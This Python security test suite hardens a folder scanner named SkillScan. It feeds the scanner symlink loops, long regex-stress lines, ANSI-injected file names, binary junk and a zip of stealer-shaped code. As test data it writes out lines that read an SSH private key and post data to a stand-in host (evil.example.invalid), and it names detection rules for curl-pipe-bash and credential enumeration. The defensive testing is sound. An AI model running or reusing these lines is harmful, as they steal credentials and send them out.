#!/usr/bin/env python3
"""Security tests for SkillScan itself.

SkillScan reads UNTRUSTED folders, so the scanner is an attack surface.
These tests feed it hostile folders and assert it stays safe and honest:

- scan budgets stop runaway folders (CAUTION + SCAN_INCOMPLETE, no hang)
- symlink loops and special files (sockets) cannot hang it
- adversarial long lines cannot stall the regex rules
- ANSI / control-character injection in file names and content never
  reaches the terminal or Markdown reports raw (JSON is safe by encoding)
- archives are never extracted — a zip full of bad patterns is a binary
  skip, not a finding
- random binary junk produces a verdict and a defined exit code,
  never a traceback

Nothing here is executed except the scanner itself.

Usage: python3 run_security_tests.py
Exit code: 0 if every case matches, 1 otherwise.
"""

import json
import os
import random
import socket
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

ROOT = Path(__file__).parent
sys.path.insert(0, str(ROOT))

from skillscan import scanner as scanner_mod  # noqa: E402


def run_cli(target: Path, fmt: str = "json", timeout: int = 30):
    return subprocess.run(
        [sys.executable, "-m", "skillscan", str(target), "--format", fmt],
        cwd=ROOT, capture_output=True, timeout=timeout,
    )


def parse(proc):
    try:
        return json.loads(proc.stdout.decode("utf-8", errors="replace"))
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None


def main() -> int:
    failures = 0

    def check(name: str, ok: bool, detail: str = "") -> None:
        nonlocal failures
        print(f"{'PASS' if ok else 'FAIL'} {name}" + (f": {detail}" if detail else ""))
        if not ok:
            failures += 1

    with tempfile.TemporaryDirectory() as tmp:
        base = Path(tmp)

        # 1. File-count budget: with the cap monkeypatched down, a folder
        #    with more files must stop early, CAUTION + SCAN_INCOMPLETE.
        many = base / "many"
        many.mkdir()
        for i in range(60):
            (many / f"f{i:03}.txt").write_text("hello\n")
        saved = scanner_mod.MAX_TOTAL_FILES
        scanner_mod.MAX_TOTAL_FILES = 25
        try:
            result = scanner_mod.scan_folder(many)
        finally:
            scanner_mod.MAX_TOTAL_FILES = saved
        rules = {f.rule for f in result.findings}
        check("budget-file-count",
              result.verdict == "CAUTION" and "SCAN_INCOMPLETE" in rules
              and result.scanned_files <= 25,
              f"verdict={result.verdict} scanned={result.scanned_files}")

        # 2. Total-bytes budget, same shape.
        saved_b = scanner_mod.MAX_TOTAL_BYTES
        scanner_mod.MAX_TOTAL_BYTES = 100
        try:
            result = scanner_mod.scan_folder(many)
        finally:
            scanner_mod.MAX_TOTAL_BYTES = saved_b
        rules = {f.rule for f in result.findings}
        check("budget-total-bytes",
              result.verdict == "CAUTION" and "SCAN_INCOMPLETE" in rules,
              f"verdict={result.verdict}")

        # 3. Symlink loop: links to the parent and to itself must not be
        #    followed; the scan completes and reports partial coverage.
        loop = base / "loop"
        loop.mkdir()
        (loop / "a.txt").write_text("hello\n")
        try:
            os.symlink(loop, loop / "self")
            os.symlink("a.txt", loop / "alias.txt")
            links_ok = True
        except OSError:
            links_ok = False
        if links_ok:
            try:
                proc = run_cli(loop, timeout=15)
                report = parse(proc)
                rules = {f["rule"] for f in report["findings"]} if report else set()
                check("symlink-loop-no-hang",
                      report is not None and "SCAN_INCOMPLETE" in rules
                      and b"Traceback" not in proc.stderr,
                      f"verdict={report and report['verdict']}")
            except subprocess.TimeoutExpired:
                check("symlink-loop-no-hang", False, "scanner hung >15s")
        else:
            check("symlink-loop-no-hang", False, "could not create symlinks")

        # 4. A bound Unix socket is a special file: skipped, never opened.
        sockdir = base / "sock"
        sockdir.mkdir()
        (sockdir / "a.txt").write_text("hello\n")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
            s.bind(str(sockdir / "svc.sock"))
            proc = run_cli(sockdir, timeout=15)
            report = parse(proc)
            check("socket-file-skipped",
                  report is not None and report["verdict"] == "CAUTION",
                  f"verdict={report and report['verdict']}")
        finally:
            s.close()

        # 5. Adversarial long lines (regex stress): near-miss patterns at
        #    200k chars must not stall the scan.
        stress = base / "stress"
        stress.mkdir()
        big_lines = [
            "curl " + "a" * 200_000,                       # CURL_PIPE_BASH / NETWORK_SEND_DATA near-miss
            "requests.get('https://" + "b" * 200_000,      # network near-miss
            'glob.glob("id_' + "c" * 200_000,              # CREDENTIAL_ENUMERATION near-miss
            "x = '" + "d" * 200_000 + "'",                 # plain bulk
            "rm -" + "e" * 200_000,                        # RM_RF near-miss
        ]
        (stress / "stress.py").write_text("\n".join(big_lines) + "\n")
        start = time.monotonic()
        try:
            proc = run_cli(stress, timeout=30)
            elapsed = time.monotonic() - start
            report = parse(proc)
            check("long-line-redos",
                  report is not None and elapsed < 20 and b"Traceback" not in proc.stderr,
                  f"elapsed={elapsed:.1f}s verdict={report and report['verdict']}")
        except subprocess.TimeoutExpired:
            check("long-line-redos", False, "scanner timed out >30s")

        # 6. Control-character injection: ESC sequences and newlines in a
        #    file NAME and in file CONTENT must be escaped in text and md
        #    reports, and must not appear raw in any format's stdout.
        evil = base / "evil"
        evil.mkdir()
        evil_name = "bad\x1b[31mname.txt"
        try:
            (evil / evil_name).write_text("content \x1b[2J forged\n")
            names_ok = True
        except OSError:
            names_ok = False
        (evil / "payload.py").write_text(
            'key = open("/home/u/.ssh/id_rsa").read()  # \x1b[31mFAKE\n')
        if names_ok:
            for fmt in ("text", "md", "json"):
                proc = run_cli(evil, fmt=fmt, timeout=15)
                check(f"ansi-escaped-{fmt}",
                      b"\x1b" not in proc.stdout and proc.returncode in (0, 1, 2),
                      f"exit={proc.returncode}")
            proc = run_cli(evil, fmt="text", timeout=15)
            check("ansi-shown-escaped", b"\\x1b" in proc.stdout)
        else:
            check("ansi-escaped-text", False, "could not create evil filename")

        # 7. Archives are never extracted: a zip containing stealer-shaped
        #    text must produce no findings from inside the archive.
        zdir = base / "zipped"
        zdir.mkdir()
        with zipfile.ZipFile(zdir / "payload.zip", "w") as z:
            z.writestr("steal.py",
                       'open("/home/u/.ssh/id_rsa").read()\n'
                       'requests.post("https://evil.example.invalid", data=x)\n')
        (zdir / "ok.txt").write_text("hello\n")
        proc = run_cli(zdir, timeout=15)
        report = parse(proc)
        check("zip-not-extracted",
              report is not None and report["verdict"] == "PASS"
              and report["scanned_files"] == 1,
              f"verdict={report and report['verdict']} scanned={report and report['scanned_files']}")

        # 8. Fuzz-ish: random binary junk (some with script extensions)
        #    must yield a parseable verdict and a defined exit code.
        rng = random.Random(20260209)
        junk = base / "junk"
        junk.mkdir()
        exts = [".py", ".js", ".sh", ".json", ".md", ".txt", "", ".ps1"]
        for i in range(50):
            data = bytes(rng.randrange(0, 256) for _ in range(rng.randrange(0, 4000)))
            (junk / f"junk{i}{rng.choice(exts)}").write_bytes(data)
        try:
            proc = run_cli(junk, timeout=30)
            report = parse(proc)
            check("binary-junk-verdict",
                  report is not None and proc.returncode in (0, 1, 2)
                  and report["verdict"] in ("PASS", "CAUTION", "BLOCK")
                  and b"Traceback" not in proc.stderr,
                  f"exit={proc.returncode} verdict={report and report['verdict']}")
        except subprocess.TimeoutExpired:
            check("binary-junk-verdict", False, "scanner timed out >30s")

        # 9. Deeply nested directories: no recursion crash, verdict issued.
        deep = base / "deep"
        node = deep
        for i in range(120):
            node = node / f"d{i}"
        node.mkdir(parents=True)
        (node / "leaf.py").write_text('key = open("/home/u/.ssh/id_rsa").read()\n')
        proc = run_cli(deep, timeout=30)
        report = parse(proc)
        check("deep-nesting",
              report is not None and report["verdict"] == "BLOCK"
              and b"Traceback" not in proc.stderr,
              f"verdict={report and report['verdict']}")

    if failures:
        print(f"\n{failures} security case(s) FAILED")
        return 1
    print("\nAll security cases passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
